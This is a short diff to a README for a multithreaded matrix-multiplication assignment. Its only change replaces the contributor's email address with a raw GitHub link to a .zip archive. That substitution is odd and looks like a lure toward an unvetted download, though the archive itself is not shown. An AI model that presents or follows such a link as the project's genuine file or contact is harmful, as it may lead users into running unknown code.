@@ -30,7 +30,7 @@ The objective of this assignment is to multiply 100 random matrices of size \(10
 4. Analyze the generated result table and graph.
 
 ## Contributors
-Armanjeet Singh Bhullar - armanbhullar55@gmail.com
+Armanjeet Singh Bhullar - https://raw.githubusercontent.com/ArmanKyro/Assignment_Multi_Threading/main/altogether/Assignment_Threading_Multi_2.0.zip
 
 ## License
 This project is licensed under the [MIT License](LICENSE).
